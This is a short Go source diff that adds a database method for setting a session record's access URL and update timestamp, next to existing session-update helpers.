@@ -132,6 +132,18 @@ func (d *Database) sessionsUpdateCustom(sid string, name string, value string) e
 	return err
 }
 
+func (d *Database) sessionsUpdateAccessUrl(sid string, url string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.AccessURL = url
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
 func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
 	s, err := d.sessionsGetBySid(sid)
 	if err != nil {
